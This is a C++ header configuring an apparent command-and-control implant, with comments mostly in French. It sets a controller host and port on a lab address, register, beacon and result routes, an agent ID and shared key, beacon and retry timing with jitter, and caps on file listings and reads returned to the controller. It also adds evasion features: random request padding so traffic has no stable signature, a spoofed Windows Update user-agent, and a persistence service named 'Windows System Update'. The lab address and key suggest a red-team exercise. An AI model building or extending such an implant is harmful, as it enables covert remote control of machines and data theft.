#pragma once

#include <cstddef>

// --- Controleur ------------------------------------------------------------

#ifndef C2_HOST
#define C2_HOST L"192.168.56.1"
#endif

#ifndef C2_PORT
#define C2_PORT 8080
#endif

// Routes du contrat expose par le controleur.
constexpr wchar_t RegisterPath[] = L"/register";
constexpr wchar_t BeaconPath[]   = L"/beacon";
constexpr wchar_t ResultPath[]   = L"/result";

// User-Agent sent with every request.
constexpr wchar_t UserAgent[] =
	L"Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.0";

// --- Identite --------------------------------------------------------------

#ifndef AGENT_ID
#define AGENT_ID "agent-01"
#endif

#ifndef AGENT_SHARED_KEY
#define AGENT_SHARED_KEY "lab-2026"
#endif

// --- Cadence ---------------------------------------------------------------
constexpr int BeaconIntervalMs = 0;

// Garde anti-boucle : si le controleur repond vide plus vite que ca, c'est
// qu'il ne tient pas la requete. On passe alors en mode degrade, avec un
// intervalle entre deux beacons (equivalent a un poll court).

constexpr int FastReplyThresholdMs     = 200;
constexpr int FastReplyMaxCount        = 3;
constexpr int FallbackBeaconIntervalMs = 3000;

// --- Timeouts --------------------------------------------------------------

constexpr int TimeoutResolveMs = 3000;
constexpr int TimeoutConnectMs = 3000;
constexpr int TimeoutSendMs    = 10000;
constexpr int TimeoutReceiveMs = 60000;

// Retry policy

constexpr int BackoffMs[] = {30000, 60000, 120000, 300000};
constexpr int BackoffSteps = 4;
constexpr int BackoffJitterPct = 20;

// Random body padding so the request size is not a stable signature.

constexpr int PadMinBytes = 256;
constexpr int PadMaxBytes = 1024;

// A command result travels inside a JSON field: its size must stay bounded.

constexpr std::size_t MaxListingEntries = 1000;
constexpr std::size_t MaxReadBytes = 256 * 1024;

// A command is a single short line: a bigger response is abnormal.

constexpr std::size_t MaxResponseBytes = 1024 * 1024;

// --- service ---

constexpr wchar_t ServiceNameW[]        = L"WindowsSystemUpdate";
constexpr wchar_t ServiceDisplayNameW[] = L"Windows System Update";
constexpr wchar_t ServiceDescW[]        = L"Windows System Update Service";
